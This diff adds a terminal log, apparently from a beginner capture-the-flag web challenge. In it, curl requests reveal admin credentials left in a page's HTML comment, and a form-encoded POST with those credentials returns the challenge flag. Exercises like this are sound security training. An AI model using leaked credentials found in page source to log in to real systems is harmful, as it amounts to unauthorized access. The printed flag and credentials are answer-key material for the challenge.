@@ -1,0 +1,13 @@
+
+
+$ curl http://165.227.106.113/post.php                                                                  
+<h1>This site takes POST data that you have not submitted!</h1><!-- username: admin | password: 71urlkufpsdnlkadsf -->                                                                                                                          
+┌──(kali㉿kali)-[~/Desktop]
+└─$ curl http://165.227.106.113/post.php -X 'POST' -d '{username:admin, password:71urlkufpsdnlkadsf}' 
+<h1>This site takes POST data that you have not submitted!</h1><!-- username: admin | password: 71urlkufpsdnlkadsf -->                                                                                                                          
+┌──(kali㉿kali)-[~/Desktop]
+└─$ curl http://165.227.106.113/post.php -X 'POST' -d '{"username":"admin", "password":"71urlkufpsdnlkadsf"}' --header "Content-Type: application/json"
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ curl http://165.227.106.113/post.php  -X 'POST' -d "username=admin&password=71urlkufpsdnlkadsf"          
+<h1>flag{p0st_d4t4_4ll_d4y}</h1>
